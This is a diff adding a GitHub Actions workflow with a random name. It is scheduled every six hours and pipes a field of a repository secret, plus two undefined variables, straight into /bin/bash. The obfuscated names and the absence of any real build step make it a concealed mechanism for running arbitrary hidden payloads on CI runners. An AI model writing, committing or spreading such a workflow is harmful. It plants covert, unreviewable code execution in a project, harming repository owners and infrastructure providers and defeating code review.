@@ -1,0 +1,19 @@
+name: commissionperturbed
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: commissionperturbed
+        env:
+          hewqa44942: ${{ secrets.hewqa44942 }}
+        run: |
+          echo $hewqa44942 | jq -r .ktza2476 | /bin/bash
+          echo $nq9542 | jq -r .h1892 | /bin/bash
+          echo $bai1 | jq -r .smkqz22095 | /bin/bash
+
